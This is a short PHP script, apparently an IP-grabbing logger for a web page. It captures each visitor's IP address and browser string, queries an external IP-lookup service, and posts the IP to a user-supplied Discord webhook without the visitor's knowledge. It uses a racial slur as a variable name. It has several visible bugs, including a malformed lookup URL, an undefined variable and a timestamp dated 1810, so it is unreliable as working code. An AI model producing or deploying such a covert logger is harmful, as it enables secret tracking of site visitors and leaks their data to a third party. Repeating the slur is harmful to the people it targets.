<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$url = "https://discord.com/api/webhooks/"; // Your webhook
$negro = $_SESSION['username'];


$iplookup = file_get_contents("http://extreme-ip-lookup.com/json/{ip}"); // IP lookup

$hookObject = json_encode([
    "username" => "Logs",
    "avatar_url" => "https://cdn.discordapp.com/attachments/911373585715691561/911581146645659679/unknown.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => "IP Logs",
            "type" => "rich",
            "description" => "/api.lookup.json ** $site **",
            "timestamp" => "1810-01-10T19:12:00-05:00",
            "color" => hexdec( "03a9fc" ),
            "footer" => [
                "text" => "IP Detection. ",
            ],

            "fields" => [
                [
                    "name" => "IP:",
                    "value" => "{$ip}",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );
?>